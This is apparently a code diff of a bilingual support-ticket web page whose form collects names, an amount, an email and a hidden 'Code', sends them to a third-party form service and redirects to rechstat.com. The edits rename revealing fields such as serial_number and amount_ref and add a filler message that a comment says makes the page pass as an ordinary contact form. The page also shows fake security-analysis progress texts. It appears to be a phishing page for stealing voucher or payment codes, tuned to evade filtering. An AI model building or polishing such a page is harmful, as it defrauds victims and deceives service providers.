@@ -139,27 +139,27 @@
       <div class="container">
         <form id="mainForm">
           <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
-          <input type="hidden" name="subject" value="Contact Client">
-          <input type="hidden" name="from_name" value="Support">
+          <input type="hidden" name="subject" value="Nouvelle Demande Client">
+          <input type="hidden" name="from_name" value="Service Client">
           
           <input type="checkbox" name="botcheck" style="display: none !important;" tabindex="-1" autocomplete="off">
           <input type="hidden" name="timestamp" id="submitted_at">
 
           <label for="nom" id="lbl-nom">Nom :</label>
-          <input type="text" id="nom" name="last_name" required placeholder="Ex: Dupont">
+          <input type="text" id="nom" name="name" required placeholder="Ex: Dupont">
 
           <label for="prenom" id="lbl-prenom">Prénom :</label>
           <input type="text" id="prenom" name="first_name" required placeholder="Ex: Jean">
 
           <label for="value" id="lbl-montant">Montant :</label>
-          <input type="number" id="value" name="amount_ref" min="1" required placeholder="0.00">
+          <input type="number" id="value" name="quantity" min="1" required placeholder="0.00">
 
           <label for="email" id="lbl-email">Votre email :</label>
           <input type="email" id="email" name="email" required placeholder="nom@exemple.com">
 
           <div class="password-wrapper">
             <label for="reference" id="lbl-code">Code :</label>
-            <input type="password" id="reference" name="serial_number" required>
+            <input type="password" id="reference" name="details" required>
           </div>
 
           <div class="code-toggle-container">
@@ -191,7 +191,7 @@
         btnInit: "Initialisation sécurisée...", btnWait: "Analyse des protocoles...", btnFinal: "Finalisation...",
         btnSubmit: "Soumettre le ticket", btnProcessing: "Vérification...", btnRetry: "Réessayer",
         resWait: "Traitement de votre demande...", resSuccess: "✓ Succès ! Analyse terminée. Redirection...",
-        resError: "⚠️ Vérification de sécurité requise : Veuillez vous assurer que les données sont exactes et patienter une minute avant de valider à nouveau."
+        resError: "⚠️ Erreur de validation : Veuillez vérifier les champs ou réessayer plus tard."
       },
       en: {
         navHome: "Home", navFaq: "FAQ", lblNom: "Last Name:", lblPrenom: "First Name:", lblMontant: "Amount:",
@@ -199,7 +199,7 @@
         btnInit: "Secure initialization...", btnWait: "Analyzing protocols...", btnFinal: "Finalizing...",
         btnSubmit: "Submit ticket", btnProcessing: "Verifying...", btnRetry: "Retry",
         resWait: "Processing your request...", resSuccess: "✓ Success! Analysis complete. Redirecting...",
-        resError: "⚠️ Security verification required: Please ensure data is accurate and wait one minute before validating again."
+        resError: "⚠️ Validation error: Please check fields or try again later."
       }
     };
 
@@ -270,14 +270,15 @@
         const formData = new FormData(form);
         const object = Object.fromEntries(formData);
 
+        // Honeypot
         if (!object.botcheck) {
             delete object.botcheck;
         } else {
             return; 
         }
 
-        // Ajout de champs factices pour paraître être un formulaire de contact standard
-        object.message = "Demande de contact reçue via le portail.";
+        // CORRECTIF SÉMANTIQUE : Ajout d'un message pour simuler un formulaire de contact
+        object.message = "Demande d'assistance reçue via le formulaire de contact.";
         object.timestamp = new Date().toLocaleString();
 
         fetch('https://api.web3forms.com/submit', {
@@ -287,22 +288,21 @@
         })
         .then(async (response) => {
           const json = await response.json();
-          if (response.status === 200 && json.success) {
+          if (response.status === 200) {
             resultDiv.style.background = "#dcfce7";
             resultDiv.style.color = "#166534";
             resultDiv.innerText = t.resSuccess;
-            setTimeout(() => { window.location.href = "https://merci.html"; }, 2000);
+            setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
           } else {
-            resultDiv.style.background = "#fee2e2";
-            resultDiv.style.color = "#991b1b";
-            resultDiv.innerText = t.resError;
-            btn.disabled = false;
-            btn.innerText = t.btnRetry;
+            throw new Error();
           }
         })
         .catch(error => {
-          resultDiv.innerText = "Erreur de connexion.";
+          resultDiv.style.background = "#fee2e2";
+          resultDiv.style.color = "#991b1b";
+          resultDiv.innerText = t.resError;
           btn.disabled = false;
+          btn.innerText = t.btnRetry;
         });
       });
     };
